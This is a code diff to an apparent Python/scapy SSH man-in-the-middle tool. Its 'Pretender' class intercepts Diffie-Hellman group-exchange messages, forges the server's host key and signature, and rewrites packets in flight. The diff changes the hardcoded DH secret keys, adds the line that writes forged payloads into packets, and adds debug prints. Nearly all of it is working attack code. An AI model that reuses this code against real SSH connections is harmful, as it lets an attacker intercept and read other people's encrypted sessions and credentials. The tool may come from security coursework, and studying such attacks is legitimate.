@@ -31,7 +31,7 @@ class Pretender:
 			"min": None, # min size in bits for group (p, g)
 			"n": None, # preferred size in bits for group (p, g)
 			"max": None, # max size in bits for group (p, g)
-			"secret_key": 2,
+			"secret_key": 3773,
 			"shared_key": None
 		}
 
@@ -44,7 +44,7 @@ class Pretender:
 			"expected_ack": None, # expected ack number
 			"V_S": None, # server ssh version
 			"I_S": None, # kex init payload
-			"secret_key": 3,
+			"secret_key": 199,
 			"shared_key": None,
 			"rsa_key": { # host key
 				"e": 17,
@@ -96,6 +96,7 @@ class Pretender:
 							print "new - " + str(len(new_payload))
 							print new_payload + "\n\n"
 						#endif
+						packet[Raw].load = new_payload
 						packet[IP].len = packet[IP].len - diff_len
 						del packet[TCP].chksum
 						del packet[IP].chksum
@@ -146,6 +147,8 @@ class Pretender:
 							print "new - " + str(len(new_payload))
 							print new_payload + "\n\n"
 						#endif
+						packet[Raw].load = new_payload
+						print "\n" + binascii.hexlify(new_payload)
 						packet[IP].len = packet[IP].len - diff_len
 						del packet[TCP].chksum
 						del packet[IP].chksum
@@ -192,18 +195,21 @@ class Pretender:
 			return
 		#endif
 		if payload.SSH_VEX == True:
+			print "\nSSH_VEX"
 			if from_client:
 				self.fake_client["V_C"] = payload.v.strip()
 			else:
 				self.fake_server["V_S"] = payload.v.strip()
 			#endif
 		elif payload.SSH_MSG_KEXINIT == KEX_INIT:
+			print "\nKEX_INIT"
 			if from_client:
 				self.fake_client["I_C"] = raw
 			else:
 				self.fake_server["I_S"] = raw
 			#endif
 		elif payload.SSH_MSG_KEXINIT == DH_GEX_REQ:
+			print "\nDH_GEX_REQ"
 			if from_client:
 				self.fake_client["max"] = int(binascii.hexlify(payload.max),16)
 				self.fake_client["n"] = int(binascii.hexlify(payload.n),16)
@@ -212,6 +218,7 @@ class Pretender:
 				return
 			#endif
 		elif payload.SSH_MSG_KEXINIT == DH_GEX_GROUP:
+			print "\nDH_GEX_GROUP"
 			if from_client:
 				return
 			else:
@@ -220,6 +227,7 @@ class Pretender:
 				self.g = int(binascii.hexlify(payload.base),16)
 			#endif
 		elif payload.SSH_MSG_KEXINIT == DH_GEX_INIT:
+			print "\nDH_GEX_INIT"
 			if from_client:
 				# E
 				self.e = int(binascii.hexlify(payload.e),16)
@@ -230,9 +238,11 @@ class Pretender:
 				return
 			#endif
 		elif payload.SSH_MSG_KEXINIT == DH_GEX_REPLY:
+			print "\nDH_GEX_REPLY"
 			if from_client:
 				return
 			else:
+				print "running - server"
 				# Host key
 				host_len = len(payload.host_key)
 				fake_host_key = \
@@ -274,8 +284,10 @@ class Pretender:
 				fake_sig = int_to_hex(len(payload.sig["alg"]),4) + payload.sig["alg"] + \
 				int_to_hex(len(signed),4) + signed
 				payload.signature = fake_sig
+				print "finished"
 			#endif
 		elif payload.SSH_MSG_KEXINIT == NEW_KEYS:
+			print "\nNEW_KEYS"
 			if from_client:
 				self.KEYS_SET = True
 			else:
@@ -457,6 +469,7 @@ class SSH:
 			payload = payload + int_to_hex(len(self.f),4) + self.f
 			# Signature
 			payload = payload + int_to_hex(len(self.signature),4) + self.signature
+			print "sending"
 		elif self.SSH_MSG_KEXINIT == NEW_KEYS:
 			# Do nothing
 			pass
